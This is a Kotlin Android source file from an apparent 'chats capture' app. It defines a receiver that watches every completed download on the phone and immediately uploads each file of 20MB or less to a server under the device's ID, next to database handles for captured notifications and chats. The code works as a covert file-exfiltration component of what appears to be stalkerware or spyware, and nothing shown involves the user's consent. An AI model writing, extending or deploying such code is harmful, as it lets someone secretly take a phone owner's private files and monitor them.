package com.chats.capture.receivers

import android.app.DownloadManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import com.chats.capture.CaptureApplication
import com.chats.capture.database.MediaFileDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.models.MediaFile
import com.chats.capture.models.UploadStatus
import com.chats.capture.utils.FileUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import timber.log.Timber
import java.io.File

/**
 * BroadcastReceiver that monitors DownloadManager for completed downloads
 * Immediately uploads files < 10MB to the server
 */
class DownloadCompleteReceiver : BroadcastReceiver() {
    
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val MAX_UPLOAD_SIZE = 20 * 1024 * 1024L // 20MB
    
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == DownloadManager.ACTION_DOWNLOAD_COMPLETE) {
            val downloadId = intent.getLongExtra(DownloadManager.EXTRA_DOWNLOAD_ID, -1L)
            if (downloadId != -1L) {
                Timber.tag("DOWNLOAD_MONITOR").i("📥 Download completed - ID: $downloadId")
                scope.launch {
                    handleDownloadComplete(context, downloadId)
                }
            }
        }
    }
    
    private suspend fun handleDownloadComplete(context: Context, downloadId: Long) {
        try {
            val downloadManager = context.getSystemService(Context.DOWNLOAD_SERVICE) as? DownloadManager
                ?: return
            
            val query = DownloadManager.Query().setFilterById(downloadId)
            val cursor: Cursor = downloadManager.query(query) ?: return
            
            if (cursor.moveToFirst()) {
                val status = cursor.getInt(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_STATUS))
                
                if (status == DownloadManager.STATUS_SUCCESSFUL) {
                    val fileUri = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_LOCAL_URI))
                    val fileName = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_TITLE))
                    val fileSize = cursor.getLong(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_TOTAL_SIZE_BYTES))
                    val mimeType = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_MEDIA_TYPE))
                    
                    Timber.tag("DOWNLOAD_MONITOR").d("Download successful: $fileName, size: $fileSize, type: $mimeType")
                    
                    // Check file size (must be <= 20MB)
                    if (fileSize > 0 && fileSize <= MAX_UPLOAD_SIZE) {
                        val uri = Uri.parse(fileUri)
                        val filePath = FileUtils.getPathFromUri(context, uri)
                        
                        if (filePath != null) {
                            val file = File(filePath)
                            if (file.exists() && file.isFile) {
                                val actualFileSize = file.length()
                                if (actualFileSize > MAX_UPLOAD_SIZE) {
                                    Timber.tag("DOWNLOAD_MONITOR").w("⚠️ File size ${actualFileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping upload: $fileName")
                                } else {
                                    Timber.tag("DOWNLOAD_MONITOR").i("📤 File detected: $fileName (${actualFileSize / (1024 * 1024)}MB) - Uploading immediately...")
                                    uploadFileImmediately(context, file, fileName, mimeType)
                                }
                            } else {
                                Timber.tag("DOWNLOAD_MONITOR").w("File not found: $filePath")
                            }
                        } else {
                            Timber.tag("DOWNLOAD_MONITOR").w("Could not resolve file path from URI: $fileUri")
                        }
                    } else {
                        Timber.tag("DOWNLOAD_MONITOR").w("⚠️ File size ${fileSize / (1024 * 1024)}MB exceeds 20MB limit - Skipping upload: $fileName")
                    }
                } else {
                    val reason = cursor.getInt(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_REASON))
                    Timber.tag("DOWNLOAD_MONITOR").w("Download failed: status=$status, reason=$reason")
                }
            }
            
            cursor.close()
        } catch (e: Exception) {
            Timber.tag("DOWNLOAD_MONITOR").e(e, "Error handling download complete: ${e.message}")
        }
    }
    
    private suspend fun uploadFileImmediately(
        context: Context,
        file: File,
        fileName: String,
        mimeType: String?
    ) {
        try {
            val database = (context.applicationContext as CaptureApplication).database
            val mediaFileDao = database.mediaFileDao()
            val deviceRegistrationManager = DeviceRegistrationManager(context)
            val deviceId = deviceRegistrationManager.getDeviceId()
            
            // Calculate checksum
            val checksum = FileUtils.calculateChecksum(file)
            
            // Check if file already exists (by checksum)
            val existing = mediaFileDao.findMediaFileByChecksum(checksum)
            if (existing != null && existing.uploadStatus == UploadStatus.SUCCESS) {
                Timber.tag("DOWNLOAD_MONITOR").d("File already uploaded: $fileName")
                return
            }
            
            // Determine MIME type
            val finalMimeType = mimeType ?: FileUtils.getMimeTypeFromFile(file)
            
            // Create MediaFile entry
            val mediaFile = MediaFile(
                deviceId = deviceId,
                notificationId = "download_${System.currentTimeMillis()}",
                appPackage = "download_manager", // Mark as downloaded file
                localPath = file.absolutePath,
                fileSize = file.length(),
                mimeType = finalMimeType,
                checksum = checksum,
                uploadStatus = UploadStatus.PENDING
            )
            
            // Save to database
            mediaFileDao.insertMediaFile(mediaFile)
            Timber.tag("DOWNLOAD_MONITOR").d("File saved to database: ${mediaFile.id}")
            
            // Upload immediately
            val mediaUploadManager = MediaUploadManager(
                context,
                mediaFileDao,
                database.notificationDao(),
                database.chatDao()
            )
            
            val success = mediaUploadManager.uploadMediaFile(mediaFile)
            if (success) {
                Timber.tag("DOWNLOAD_MONITOR").i("✅ File uploaded immediately: $fileName")
            } else {
                Timber.tag("DOWNLOAD_MONITOR").w("⚠️ File upload queued (will retry): $fileName")
            }
        } catch (e: Exception) {
            Timber.tag("DOWNLOAD_MONITOR").e(e, "Error uploading file immediately: ${e.message}")
        }
    }
}
